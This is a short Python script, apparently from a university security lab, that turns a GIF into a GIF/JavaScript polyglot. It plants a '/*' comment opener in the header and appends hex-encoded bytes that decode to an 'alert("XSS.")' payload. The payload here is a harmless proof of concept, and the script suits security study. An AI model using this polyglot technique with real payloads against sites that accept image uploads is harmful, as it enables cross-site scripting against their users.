def inject_into_file(fname):
    """Injects the payload into existing GIF
    NOTE: if the GIF contains \xFF\x2A and/or \x2A\x5C might cause issues
    """

    with open(fname + "_malw.gif", "w+b") as fout:
            with open(fname, "rb") as fin:
                for line in fin:
                    print("Line read\n")
                    ls1 = line.replace(b'\x2A\x2F', b'\x00\x00')
                    ls2 = ls1.replace(b'\x2F\x2A', b'\x00\x00')             
                    fout.write(ls2)                 
            fout.seek(6,0)
            fout.write(b'\x2F\x2A') #/*
        
    f = open(fname + "_malw.gif", "a+b") #appending mode
    f.write(b'\x2A\x2F\x3D\x31\x3B')
    f.write(b'\x2A\x2F\x3D\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x2E\x22\x29')
    f.write(b'\x3B')
    f.close()
    print("Procedure complete, check gif.\n")
    return True
   

    
inject_into_file('C:/Users/Rodrigo/VSProjects/ssr-feup/project/vulnerable/gandalf.gif')